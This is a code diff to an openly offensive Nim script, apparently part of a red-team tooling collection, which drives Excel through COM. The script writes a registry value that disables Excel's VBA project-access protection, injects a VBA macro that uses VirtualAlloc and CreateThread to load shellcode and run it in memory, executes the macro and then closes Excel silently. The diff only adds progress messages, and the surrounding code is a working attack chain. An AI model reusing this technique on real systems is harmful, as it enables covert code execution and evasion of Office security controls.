@@ -1,10 +1,8 @@
 #[
     Author: Marcello Salvati, Twitter: @byt3bl33d3r
     License: BSD 3-Clause
-
     This is some funky shit.
     Winim allows you to use COM objects like a script via the "comScript" macro.
-
     References:
         - https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba
 ]#
@@ -16,12 +14,19 @@ comScript:
     var objExcel = CreateObject("Excel.Application")
     objExcel.Visible = false
     var WshShell = CreateObject("WScript.Shell")
+
     var Application_Version = objExcel.Version
+    echo fmt"[+] Excel Version: {objExcel.Version} is detected on System"
+
+    echo fmt"[+] Adjusting Excel Security Settings via Registry"
     var strRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AccessVBOM"
     WshShell.RegWrite(strRegPath, 1, "REG_DWORD")
+    
+    echo fmt"[+] Creating VBA object in Excel"
     var objWorkbook = objExcel.Workbooks.Add()
     var xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
 
+    echo fmt"[+] Planting Shellcode into Excel VBA Macro"
     var strCode = "#If Vba7 Then\n"
     strCode = strCode & "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n"
     strCode = strCode & "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n"
@@ -60,8 +65,9 @@ comScript:
     strCode = strCode & "        Next Zolde\n"
     strCode = strCode & "        Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n"
     strCode = strCode & "End Sub\n"
-
     xlmodule.CodeModule.AddFromString(strCode)
+
+    echo fmt"[+] Running Shellcode via Excel VBA Macro"
     objExcel.Run("ExecShell")
     objExcel.DisplayAlerts = false
     objWorkbook.Close(false)
